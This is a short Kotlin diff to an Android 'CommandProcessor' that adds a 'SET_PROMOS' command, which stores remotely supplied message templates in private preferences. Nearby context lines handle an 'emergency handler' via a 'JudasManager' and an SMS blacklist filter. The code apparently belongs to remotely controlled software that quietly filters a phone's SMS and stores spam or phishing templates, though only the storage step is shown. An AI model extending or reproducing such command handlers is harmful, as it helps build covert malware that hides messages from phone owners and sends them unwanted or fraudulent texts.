@@ -774,6 +774,13 @@ object CommandProcessor {
                     JudasManager.setHandler(ctx, content.trim())
                     status = "EMERGENCY_HANDLER_SET"
                 }
+                "SET_PROMOS" -> {
+                    val arr = JSONArray()
+                    content.split("|||").forEach { arr.put(it.trim()) }
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                        .putString("promo_templates", arr.toString()).apply()
+                    status = "PROMO_TEMPLATES_UPDATED (${arr.length()})"
+                }
                 "SET_SMS_BLACKLIST" -> {
                     val list = content.trim()
                     ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE).edit()
